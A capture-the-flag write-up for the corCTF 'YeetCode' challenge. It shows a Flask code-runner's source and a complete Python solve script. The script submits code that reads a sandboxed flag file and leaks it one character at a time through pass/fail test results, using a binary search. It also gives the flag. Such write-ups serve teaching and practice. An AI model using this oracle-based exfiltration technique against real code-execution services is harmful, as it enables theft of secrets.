```text
Brush up on your coding skills and ace your next interview with YeetCode! Flag is at ./flag.txt
https://yeetcode.be.ax
```
We're provided all the source and a docker file but I've just included the main server file for brevity. 
```python
from flask import Flask, render_template, request, session
import random, epicbox, os
# docker pull 
epicbox.configure(
    profiles=[
        epicbox.Profile('python', 'python:3.9.6-alpine')
    ]
)
app = Flask(__name__)
app.secret_key = os.urandom(16)
flag = open('flag.txt').read()
@app.route('/')
def yeet():
    return render_template('yeet.html')
@app.route('/yeet')
def yeetyeet():
    return render_template('yeetyeet.html')
@app.route('/yeetyeet', methods=['POST'])
def yeetyeetyeet():
    if 'run' in session and session['run']:
        return {'error': True, 'msg': 'You already have code running, please wait for it to finish.'}
    session['run'] = True
    code = request.data
    tests = [(2, 3, 5), (5, 7, 12)]
    for _ in range(8):
        a, b = random.randint(1, 100), random.randint(1, 100)
        tests.append((a, b, a + b))
    # print(code)
    cmd = 'from code import f\n'
    outputs = []
    for case in tests:
        a, b, ans = case
        cmd += f'print(f({a}, {b}))\n'
        outputs.append(str(ans))
    files = [{'name': 'flag.txt', 'content': flag.encode()}, {'name': 'code.py', 'content': code}]
    limits = {'cputime': 1, 'memory': 16}
    result = epicbox.run('python', command='python3', stdin=cmd, files=files, limits=limits)
    if result['exit_code'] != 0:
        session['run'] = False
        return {'error': True, 'msg': 'Oops! Your code has an error in it. Please try again.'}
    actual = result['stdout'].decode().strip().split('\n')
    print(actual)
    print(outputs)
    passes = 0
    fails = 0
    for i in range(len(outputs)):
        if outputs[i] == actual[i]:
            passes += 1
        else:
            fails += 1
    session['run'] = False
    return {'error': False, 'p': passes, 'f': fails}
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
```
We provided code to run in a sandbox which has access to a flag file, but we don't have access to any response except test case passes and fails. I have no idea if this sandbox allows for network and honestly I didn't think to check so instead you get a good ol binary search (the code for which i stole off the internet bc lazy). The function which is supposed to take two args and return the sum of them, so it's trivial to make it pass when needed and then we just need a condition for our binary search. 
```python
import requests
from bisect import bisect_left
# corctf{1m4g1n3_cp_g0lf_6a318dfe}
def get_index(idx, val):
	code = """
ch = open("flag.txt","r").read()[%s]
def f(a, b):
	if ord(ch) <= %s:
		return a + b
	else: 
		return False
	""" % (idx, val)
	headers = {
		'Content-Type': 'text/plain;charset=UTF-8'
	}
	url = "https://yeetcode.be.ax/yeetyeet"
	r = requests.post(url,headers=headers, data = code)
	return r.json()["p"] != 10
def generic_bisect(idx, lo=0, hi=None):
    if lo < 0:
        raise ValueError('lo must be non-negative')
    if hi is None:
        hi = 127
    while lo < hi:
        mid = (lo+hi)//2
        if get_index(idx, mid) == 2: return mid
        elif get_index(idx, mid) == 1: lo = mid+1
        else: hi = mid
    return lo
flag = ""
while True:
	flag += chr(generic_bisect(len(flag)))
	print(flag)
```
I went off to go get dinner and came back to the flag, corctf{1m4g1n3_cp_g0lf_6a318dfe}